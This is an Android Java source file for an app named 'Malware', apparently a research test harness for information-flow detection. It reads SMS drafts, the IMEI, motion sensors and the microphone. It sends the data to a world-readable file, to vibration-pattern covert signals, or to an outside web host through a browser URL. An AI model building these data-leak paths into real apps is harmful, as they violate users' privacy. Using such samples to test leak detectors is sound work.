package net.ednovak.malware;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.os.Vibrator;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Spinner;
import android.widget.Toast;
import android.widget.ToggleButton;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Random;


public class Main extends Activity implements SensorEventListener{
    private final static String TAG = "Malware";

    enum FlowNode { SMS_DRAFT, ACCEL, IMEI, RAND, FILE, VIB, BROWSER, NETWORK, STOP, GYRO, MIC };
    private Handler handler;

    private boolean showMessages = false;
    private SensorManager mSensorManager;
    private ArrayList<Float> accelData = new ArrayList<Float>();
    private int accelDataGoalSize;
    private ArrayList<Float> gyroData = new ArrayList<Float>();
    private int gyroDataGoalSize;
    private short[] micSamples = new short[0];

    private Vibrator vi;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.layout_main);
        handler = new MalwareMainHandler();
    }

    @Override
    protected void onPause(){
        super.onPause();
        if(mSensorManager!=null){
            mSensorManager.unregisterListener(this);
        }
        if(vi!=null){
            vi.cancel();
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();
        if (id == R.id.TestGuardService) {
            Intent i = new Intent(getApplicationContext(), TestGuardServer.class);
            startActivity(i);
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    // Entry point!
    public void pullFromSource(View v){

        // Get Source
        FlowNode source = readSpinner(R.id.source);
        Log.d(TAG, "Source: " + source);


        // Get Data from source
        String data = "";
        switch(source) {
            case SMS_DRAFT:
                data = pullSMS();
                break;
            case ACCEL:
                pullAccel(10); // special case, samples must flow to sink directly (timing is weird)
                break;
            case RAND:
                data = pullRand(10);
                break;
            case IMEI:
                data = pullIMEI();
                break;
            case GYRO:
                pullGyro(10); // special case, samples must flow to sink directly (timing is weird)
                break;
            case MIC:
                pullMic(88200);
                break;
        }

        // These are handeled using message / handler paradigm
        if(source != FlowNode.ACCEL && source != FlowNode.GYRO && source != FlowNode.MIC) {
            // Show the message / data in a toast
            showMessage(data);
            // Send data to sink
            sendToSink(data);
        }

    }

    private void sendToSink(String msg){

        // Get Sink
        FlowNode sink = readSpinner(R.id.sink);
        Log.d(TAG, "Sink: " + sink);


        switch(sink){
            case FILE:
                writeToFile("stash", msg);
                break;
            case VIB:
                writeToVibrationMotor(msg);
                break;
            case BROWSER:
                writeToBrowser(msg);
                break;
            case NETWORK:
                Toast.makeText(this, "Network Socket Not Yet Implemented", Toast.LENGTH_SHORT).show();
                break;
            case STOP:
                break;
        }
    }


    private void sendToSinkRaw(byte[] data){

        // Get Sink
        FlowNode sink = readSpinner(R.id.sink);
        switch(sink){
            case FILE:
                writeToFile("stash_raw", data);
                break;

            case VIB:
                Toast.makeText(this, "Vibration Motor Raw Not Yet Implemented", Toast.LENGTH_SHORT).show();
                break;

            case BROWSER:
                Toast.makeText(this, "Browser Raw Not Yet Implemented", Toast.LENGTH_SHORT).show();
                break;

            case NETWORK:
                Toast.makeText(this, "Network Socket Raw Not Yet Implemented", Toast.LENGTH_SHORT).show();
                break;

            case STOP:
                break;
        }
    }


    private FlowNode readSpinner(int ID){
        Spinner s = (Spinner)findViewById(ID);
        int idx = (int)s.getSelectedItemId();
        if(ID == R.id.source){
            switch(idx){
                case 0:
                    return FlowNode.SMS_DRAFT;
                case 1:
                    return FlowNode.ACCEL;
                case 2:
                    return FlowNode.RAND;
                case 3:
                    return FlowNode.IMEI;
                case 4:
                    return FlowNode.GYRO;
                case 5:
                    return FlowNode.MIC;
            }
        }
        else{
            switch(idx){
                case 0:
                    return FlowNode.FILE;
                case 1:
                    return FlowNode.VIB;
                case 2:
                    return FlowNode.BROWSER;
                case 3:
                    return FlowNode.NETWORK;
                case 4:
                    return FlowNode.STOP;
            }
        }

        return null;
    }

    private void pullMic(final int dataLength){
        micSamples = new short[dataLength];

        final int Fs = 44100;
        int chanConfig = AudioFormat.CHANNEL_IN_MONO;
        int format = AudioFormat.ENCODING_PCM_16BIT;
        final int minBuffSize = AudioRecord.getMinBufferSize(Fs, chanConfig, format);
        final short[] buffer = new short[minBuffSize*2];
        final AudioRecord ar = new AudioRecord(MediaRecorder.AudioSource.MIC, Fs,
                chanConfig, format, minBuffSize);

        Thread t = new Thread(new Runnable(){
            public void run(){
                int offset = 0;
                int sampleCount = 0;
                while(ar.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING){
                    try {
                        int a = ar.read(buffer, 0, buffer.length / 2);
                        for(int i = 0; i < a; i++){
                            micSamples[sampleCount++] = buffer[i];
                            buffer[i] = 0; // zero out old samples
                        }
                    } catch(ArrayIndexOutOfBoundsException e){
                        e.printStackTrace();
                    }

                    Log.d(TAG, "sampleCount: " + sampleCount + "  dataLength: " + dataLength);
                    if(sampleCount > dataLength){
                        Log.d(TAG, "Stopping! Releasing!");
                        ar.stop();
                        ar.release();
                        Message msg = Message.obtain();
                        msg.what = MalwareMainHandler.MSG_MIC_DONE;
                        handler.sendMessage(msg);
                        Log.d(TAG, "Message Sent!");
                    }
                }
            }
        });
        ar.startRecording();
        t.start();
    }

    private String pullSMS(){

        Uri uri = Uri.parse( "content://sms/draft");
        String[] reqCols = new String[]{ "_id", "body"};
        ContentResolver cr = getContentResolver();
        Cursor c = cr.query(uri, reqCols, null, null, null);

        int id = c.getColumnIndex("_id");
        int body = c.getColumnIndex("body");
        if(c.getCount() == 0){
            Toast.makeText(this, "There are no SMS drafts", Toast.LENGTH_SHORT).show();
            return "";
        }
        c.moveToPosition(0);
        String msg = "ID: " + c.getInt(id) + "  body: " + c.getString(body);
        return msg;
    }



    public void pullAccel(int l){
        // Accelerometer
        mSensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        Sensor accelSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        mSensorManager.registerListener(this, mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER), SensorManager.SENSOR_DELAY_NORMAL);

        accelDataGoalSize = l;
    }

    public void pullGyro(int l){
        //Gyroscope
        mSensorManager = (SensorManager) getSystemService(Context.SENSOR_SERVICE);
        Sensor gyroSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);
        mSensorManager.registerListener(this, mSensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE), SensorManager.SENSOR_DELAY_NORMAL);

        gyroDataGoalSize = l;
    }


    private String pullRand(int l){
        StringBuilder s = new StringBuilder();
        Random r = new Random();
        for(int i = 0; i < l; i++) {
            int tmp = r.nextInt(27) + 97;
            s.append(Character.toString((char) tmp));
        }
        return s.toString();
    }

    private String pullIMEI(){
        TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        return tm.getDeviceId();
    }


    public void onAccuracyChanged(Sensor s, int accuracy){};
    public void onSensorChanged(SensorEvent event){
        if(event.sensor.getType() == Sensor.TYPE_ACCELEROMETER){
            //IllegalStateException e = new IllegalStateException();
            //e.printStackTrace();

            for(int i = 0; i < 3; i++){
                accelData.add(new Float(event.values[i]));
            }

            if(accelData.size() >= accelDataGoalSize*3) {
                finishSensor(accelData, event.sensor);
            }


        }

        if(event.sensor.getType() == Sensor.TYPE_GYROSCOPE){
            for(int i = 0; i < 3; i++){
                gyroData.add(new Float(event.values[i]));
            }

            if(gyroData.size() >= gyroDataGoalSize*3){
                finishSensor(gyroData, event.sensor);
            }
        }
    }


    private void finishSensor(ArrayList<Float> data, Sensor s){
        mSensorManager.unregisterListener(this, s);

        Message msg = Message.obtain();
        // MSG_ACCEL_DONE and MSG_GYRO_DONE are the same case
        // in the handler
        msg.what = MalwareMainHandler.MSG_ACCEL_DONE;
        msg.obj = data;
        handler.sendMessage(msg);
        data.clear();
        Log.d(TAG, "finishSensor called and finished");
    }



    private void writeToBrowser(String msg){
        String url = "http://www.ednovak.net/" + msg;
        Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
        startActivity(browserIntent);
    }


    public void showFeedback(View v){
        boolean on = ((ToggleButton) v).isChecked();
        showMessages = on;
    }

    private void showMessage(String msg){
        if(showMessages && !msg.equals("")){
            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show();
        }
    }

    private boolean writeToFile(String filename, String msg){
        return writeToFile(filename, msg.getBytes());
    }

    private boolean writeToFile(String filename, byte[] data){
        FileOutputStream outputStream = null;
        try{
            outputStream = openFileOutput(filename, Context.MODE_WORLD_READABLE);
            outputStream.write(data);
            outputStream.close();
        } catch (Exception e){
            e.printStackTrace();
            return false;
        }
        return true;
    }

    private boolean writeToVibrationMotor(String msg){

        String binary = strToBinary(msg);
        // Create pattern
        long[] pattern = new long[(binary.length()*2)+10];
        pattern[0] = 0; // start immediately
        for(int i = 0; i < binary.length(); i++){
            int j = i + 1;
            if(binary.charAt(i) == '1'){
                pattern[j*2-1] = 250; // Vibrate for 2000 ms, (1)
                pattern[j*2] = 20; // Wait for 20
            }
            else{
                pattern[j*2-1] = 125;  // Vibrate for shorter time, (0)
                pattern[j*2] = 20; // Wait for 20
            }
        }

        vi = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if(vi.hasVibrator()){
            vi.vibrate(pattern, -1);
        }
        else{
            return false;
        }
        return true;
    }


    private String strToBinary(String input) {
        byte[] bytes = input.getBytes();
        StringBuilder binary = new StringBuilder();
        for (byte b : bytes) {
            int val = b;
            for (int i = 0; i < 8; i++) {
                binary.append((val & 128) == 0 ? 0 : 1);
                val <<= 1;
            }
            binary.append(' ');
        }
        return binary.toString();
    }


    private byte[] shrtToByte(short[] sData) {
        int shortArrsize = sData.length;
        byte[] bytes = new byte[shortArrsize * 2];
        for (int i = 0; i < shortArrsize; i++) {
            bytes[i * 2] = (byte) (sData[i] & 0x00FF);
            bytes[(i * 2) + 1] = (byte) (sData[i] >> 8);
            sData[i] = 0;
        }
        return bytes;

    }

    public void stop(View v){
        Intent i = getIntent();
        finish();
        startActivity(i);
    }

    private class MalwareMainHandler extends Handler {

        public static final int MSG_MIC_DONE = 1;
        public static final int MSG_ACCEL_DONE = 2;
        public static final int MSG_GYRO_DONE = 3;

        public void handleMessage(Message msg){

            switch(msg.what){
                case MSG_MIC_DONE:

                    sendToSinkRaw(shrtToByte(micSamples));

                    StringBuilder sb = new StringBuilder();
                    for(int i = 0; i < micSamples.length; i++){
                        sb.append(micSamples[i] + " ");
                    }
                    showMessage(sb.toString());
                    micSamples = null;
                    break;

                case MSG_ACCEL_DONE:
                case MSG_GYRO_DONE:
                    String ans = "";
                    ArrayList<Float> data = (ArrayList<Float>)msg.obj;
                    for (int i = 0; i < data.size() / 3; i++) {
                        ans = ans + " x: " + data.get(i * 3) + "  y: " + data.get(i * 3 + 1) + "  z: " + data.get(i * 3 + 2);
                    }
                    showMessage(ans);
                    sendToSink(ans);
                    break;
            }
        }
    }
}
